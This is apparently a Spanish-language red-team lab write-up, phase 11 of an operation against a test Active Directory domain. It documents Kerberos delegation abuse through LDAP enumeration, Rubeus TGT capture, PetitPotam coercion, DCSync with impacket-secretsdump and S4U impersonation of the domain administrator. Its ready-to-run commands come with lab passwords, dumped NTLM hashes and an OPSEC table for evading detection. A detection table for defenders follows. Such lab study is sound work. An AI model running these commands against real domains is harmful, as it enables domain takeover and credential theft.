# Delegation Abuse — Operación GHOST FOREST
## Fase 11: Unconstrained + Constrained Delegation

**Operación:** GHOST FOREST | **Adversario:** APT29 | **Framework:** MITRE ATT&CK v14  
**Fecha:** 18/05/2026 | **Operador:** Adrián Camacho  
**Técnicas:** T1558.001 (Kerberos Ticket Abuse) | T1187 (Forced Authentication)

---

## Resumen

La Fase 11 explota dos configuraciones de delegación Kerberos inseguras presentes en el dominio `atackcorp.local`:

- **Unconstrained Delegation** en `sql_svc` — permite capturar TGTs de cualquier usuario que se autentique contra ella, incluyendo el Domain Controller
- **Constrained Delegation** en `iis_svc` — permite suplantar a cualquier usuario hacia el SPN `MSSQLSvc/dc01.atackcorp.local:1433`

Ambas técnicas demuestran cómo cuentas de servicio mal configuradas pueden convertirse en vectores de escalada hacia Domain Admin sin necesidad de explotar vulnerabilidades de software.

---

## 1. Enumeración de Configuraciones de Delegación

### Verificación via LDAP desde Kali (OPSEC — sin binarios en DC)

```bash
ldapsearch -H ldap://10.0.2.10 \
  -D "ceo.martinez@atackcorp.local" \
  -w 'Direccion2024!' \
  -b "DC=atackcorp,DC=local" \
  "(|(sAMAccountName=sql_svc)(sAMAccountName=iis_svc))" \
  sAMAccountName userAccountControl msDS-AllowedToDelegateTo 2>/dev/null | \
  grep -E "sAMAccountName|userAccountControl|AllowedToDelegateTo"
```

**Output:**
```
userAccountControl: 16777728       ← iis_svc: Constrained Delegation
sAMAccountName: iis_svc
msDS-AllowedToDelegateTo: MSSQLSvc/dc01.atackcorp.local:1433
userAccountControl: 524800         ← sql_svc: Unconstrained Delegation
sAMAccountName: sql_svc
```

### Decodificación de userAccountControl

| Valor | Interpretación |
|-------|---------------|
| `524800` = `0x80200` | `NORMAL_ACCOUNT (0x200)` + `TRUSTED_FOR_DELEGATION (0x80000)` → **Unconstrained Delegation** |
| `16777728` = `0x1000200` | `NORMAL_ACCOUNT (0x200)` + `TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000)` → **Constrained Delegation** |

> 📸 Captura: ![fase11-01](../../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-01-delegation-enum.png)

---

## 2. Unconstrained Delegation — sql_svc

### Concepto

Cuando una cuenta tiene `TrustedForDelegation=True`, el KDC incluye el TGT del usuario autenticante en el TGS que envía a dicha cuenta. Esto significa que **sql_svc recibe y almacena en memoria los TGTs de todos los usuarios que se autentican contra ella**, incluyendo el Domain Controller.

### Attack Path

```
Kali → Evil-WinRM (sql_svc) → Rubeus monitor
                                    ↑
DC-01$ → Autenticación automática → TGT de DC-01$ capturado en memoria de sql_svc
    ↑
PetitPotam (coerción NTLM) → fuerza autenticación del DC
```

### 2.1 Acceso como sql_svc

```bash
# Verificar credenciales
nxc smb 10.0.2.10 -u sql_svc -p 'SQLService2024!'

# Obtener shell
evil-winrm -i 10.0.2.10 -u sql_svc -p 'SQLService2024!'
```

### 2.2 Monitorizar TGTs con Rubeus

```powershell
# Subir Rubeus y lanzar monitor
upload /opt/redteam/windows/Rubeus.exe
.\Rubeus.exe monitor /interval:5 /nowrap
```

> 📸 Captura: ![fase11-02](../../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-02-rubeus-monitor-tgt-captured.png)

**Resultado inmediato:** Rubeus captura automáticamente el TGT de `DC-01$@ATACKCORP.LOCAL` — el DC se autentica periódicamente contra sql_svc por la configuración de delegación.

```
User  : DC-01$@ATACKCORP.LOCAL
Flags : name_canonicalize, pre_authent, initial, renewable, forwardable
```

**Nota técnica sobre los dos tickets capturados:**
- Ticket 1 (`forwarded`): TGT reenviado automáticamente por Unconstrained Delegation
- Ticket 2 (`initial`): TGT original del DC — este es el que se usa para el ataque

### 2.3 Coerción de autenticación con PetitPotam

Si el DC no se autentica automáticamente, PetitPotam fuerza la coerción:

```bash
python3 /opt/redteam/PetitPotam.py \
  -u ceo.martinez \
  -p 'Direccion2024!' \
  -d atackcorp.local \
  10.0.2.9 10.0.2.10
```

**Output clave:**
```
[+] OK! Using unpatched function!
[+] Attack worked!
```

> 📸 Captura: ![fase11-04](../../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-04-petitpotam-coercion.png)
> 📸 Captura: ![fase11-05](../../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-05-rubeus-fresh-tgt.png)

**Mecanismo:** PetitPotam abusa de MS-EFSRPC para forzar al DC a autenticarse via NTLM contra Kali. Esto genera un TGT fresco del DC que Rubeus captura en la sesión de sql_svc.

### 2.4 DCSync con credenciales obtenidas

El TGT de DC-01$ permite ejecutar DCSync — el DC tiene permisos de replicación sobre sí mismo:

```bash
impacket-secretsdump atackcorp.local/Administrador:'NuevaPassword2026!'@10.0.2.10 \
  -just-dc-ntlm
```

**Hashes obtenidos:**
```
Administrador:500: bc3abc2e0673a58e9e559d415b56d69d
krbtgt:502:        d5237a2e43cb315c90679e2a5dae34ad
DC-01$:1000:       7699bf60bbd4dd79a7fab65bbaf132dc
backup_svc:1110:   de769e624bfe51cb4109255f0f1e0910
sql_svc:1108:      53b17c54e2239d97c3c551b4a3448670
iis_svc:1109:      b329981877f0ca1243192863f356a2f9
fin.garcia:1105:   ca4d343543c50f99cececfe83bddd4c1
```

> 📸 Captura: ![fase11-06](../../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-06-dcsync-unconstrained.png)

---

## 3. Constrained Delegation — iis_svc

### Concepto

Constrained Delegation restringe a qué SPNs puede delegar una cuenta. `iis_svc` solo puede delegar hacia `MSSQLSvc/dc01.atackcorp.local:1433`. El protocolo **S4U2Proxy** permite a iis_svc obtener un TGS como cualquier usuario hacia ese SPN específico.

### Attack Path

```
Kali → getTGT (iis_svc) → getST S4U2Self + S4U2Proxy
                                              ↓
                              TGS como Administrador → MSSQLSvc/dc01:1433
```

### 3.1 Obtener TGT de iis_svc

```bash
impacket-getTGT atackcorp.local/iis_svc:'IISService2024!' -dc-ip 10.0.2.10
# Output: Saving ticket in iis_svc.ccache
```

### 3.2 S4U2Self + S4U2Proxy — Impersonar Administrador

```bash
export KRB5CCNAME=iis_svc.ccache
impacket-getST atackcorp.local/iis_svc:'IISService2024!' \
  -spn MSSQLSvc/dc01.atackcorp.local:1433 \
  -impersonate Administrador \
  -dc-ip 10.0.2.10
```

**Output:**
```
[*] Impersonating Administrador
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrador@MSSQLSvc_dc01.atackcorp.local:1433@ATACKCORP.LOCAL.ccache
```

> 📸 Captura: ![fase11-07](../../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-07-constrained-delegation-s4u.png)

### 3.3 Verificación del ticket

```python
from impacket.krb5.ccache import CCache
cc = CCache.loadFile('Administrador@MSSQLSvc_dc01.atackcorp.local:1433@ATACKCORP.LOCAL.ccache')
# Service: MSSQLSvc/dc01.atackcorp.local:1433@ATACKCORP.LOCAL ✅
```

### 3.4 Limitación — KDC_ERR_BADOPTION

Al intentar delegar hacia CIFS (fuera del SPN permitido):

```bash
impacket-getST atackcorp.local/iis_svc:'IISService2024!' \
  -spn CIFS/DC-01.atackcorp.local \
  -impersonate Administrador \
  -dc-ip 10.0.2.10
# [-] KDC_ERR_BADOPTION — SPN no permitido para iis_svc
```

**Esto es correcto** — Constrained Delegation funciona como se espera. El KDC rechaza la delegación hacia SPNs no autorizados.

> 📸 Captura: ![fase11-08](../../screenshots/FASE-11-Unconstrained-Constrained-Delegation/fase11-08-constrained-delegation-proof.png)

---

## 4. Diferencia entre Unconstrained y Constrained Delegation

| Característica | Unconstrained | Constrained |
|----------------|---------------|-------------|
| **Configuración AD** | `TrustedForDelegation=True` | `TrustedToAuthForDelegation=True` + SPNs |
| **userAccountControl** | `524800` | `16777728` |
| **Qué captura** | TGTs completos de usuarios autenticantes | Solo puede delegar a SPNs específicos |
| **Peligrosidad** | Crítica — cualquier usuario que se autentique queda comprometido | Alta — impersona usuarios hacia servicios concretos |
| **Herramienta** | Rubeus monitor + PetitPotam | impacket getST (S4U2Proxy) |
| **Cuenta en lab** | `sql_svc` | `iis_svc` |

---

## 5. OPSEC

| Acción | Riesgo | Alternativa OPSEC |
|--------|--------|-------------------|
| Subir Rubeus.exe al DC | Alto — binario conocido | Usar bloodhound-python desde Kali para enumerar |
| PetitPotam via NTLM | Medio — genera eventos 4624/4768 | Esperar autenticación espontánea del DC |
| secretsdump DRSUAPI | Medio — genera eventos 4662 | Usar VSS o NTDSUTIL para backup offline |

---

## 6. Detección (Blue Team)

| Indicador | Event ID | Descripción |
|-----------|----------|-------------|
| TGT con flag `forwarded` para cuenta de máquina | 4768 | DC autenticándose contra cuenta con UC Delegation |
| Proceso `cmd.exe` ejecutando `Rubeus.exe` | Sysmon 1 | Binario conocido de post-explotación |
| Solicitud DRSUAPI desde IP no-DC | 4662 | DCSync desde máquina no autorizada |
| Conexión EfsRpcEncryptFileSrv hacia DC | 5145 | PetitPotam coerción |

---

## 7. MITRE ATT&CK Mapping

| Técnica | ID | Fase |
|---------|-----|------|
| Steal or Forge Kerberos Tickets | T1558.001 | Unconstrained Delegation |
| Forced Authentication | T1187 | PetitPotam coerción |
| OS Credential Dumping: DCSync | T1003.006 | Objetivo final |
| Use Alternate Authentication Material | T1550.003 | Pass-the-Ticket |

---

*Operación GHOST FOREST — Adrián Camacho | Mayo 2026*  
*Entorno de laboratorio — Únicamente con fines educativos*